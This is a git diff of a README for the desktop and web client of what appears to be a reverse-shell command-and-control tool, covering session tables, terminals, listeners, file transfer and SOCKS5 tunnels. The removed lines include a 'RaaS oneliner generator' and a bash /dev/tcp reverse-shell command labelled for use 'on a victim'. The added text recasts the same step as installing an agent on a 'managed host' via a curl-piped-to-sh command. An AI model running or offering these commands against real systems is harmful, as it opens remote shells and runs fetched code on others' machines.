@@ -44,8 +44,7 @@ desktop/
 │   │       ├── Connect.tsx       # Pre-connection: profile CRUD, secret entry
 │   │       ├── Sessions.tsx      # Active sessions table + live notify events
 │   │       ├── Terminal.tsx      # xterm.js per session
-│   │       ├── Listeners.tsx     # CRUD listeners + RaaS oneliner generator
-│   │       ├── UpgradeModal.tsx  # Plain→Termite with progress bars
+│   │       ├── Listeners.tsx     # CRUD agent ingress listeners
 │   │       ├── Files.tsx         # Chunked upload/download
 │   │       └── Tunnels.tsx       # pull/push/dynamic SOCKS5/internet
 │   ├── wailsjs/                  # auto-generated; gitignored
@@ -118,11 +117,11 @@ documented at https://wails.io/docs/reference/cli.
    - **Web UI**: open `http://localhost:8080` (from `make web-ui-serve`),
      paste URL + secret, **Connect**. URL + bearer token cache to
      `localStorage`; Disconnect clears both.
-3. Trigger a reverse shell on a victim:
-   `bash -c 'bash -i >/dev/tcp/<server>/13337 0>&1'`
+3. Install and run the agent on a managed host:
+   `curl -fsSL http://<server>:13339/agent/<server>:13337 | sh`
 4. The session appears in the Sessions tab; click **Open Terminal** to
-   interact, **Upgrade** to convert to encrypted, **Group**+**Dispatch
-   Command** to fan out a shell command to multiple sessions.
+   interact, or use **Group**+**Dispatch Command** to fan out a shell
+   command to multiple sessions.
 
 ## Out of MVP scope
 
